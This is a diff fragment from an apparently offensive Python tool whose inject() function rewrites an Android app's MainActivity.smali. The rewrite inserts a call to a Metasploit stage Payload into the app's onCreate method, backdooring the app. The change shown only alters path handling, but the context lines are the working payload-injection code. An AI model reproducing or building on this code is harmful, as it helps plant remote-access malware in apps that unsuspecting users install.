@@ -89,7 +89,7 @@ def inject():
         print(g+"[✓]"+w+" hook smali:- "+y+"L"+str(hooksmali)+"/metasploit/stage/MainActivity.smali")
         print(w+"----------------------------------------------------")
         replaces = {".method "+str(method)+" onCreate(Landroid/os/Bundle;)V":".method "+str(method)+" onCreate(Landroid/os/Bundle;)V\n    invoke-static {p0}, L"+str(hooksmali)+"/metasploit/stage/Payload;->start(Landroid/content/Context;)V"}
-        for line in fileinput.input(pathsmali.replace("\n",""), inplace=True):
+        for line in fileinput.input(pathsmali, inplace=True):
             for search in replaces:
                 replaced = replaces[search]
                 line = line.replace(search,replaced)
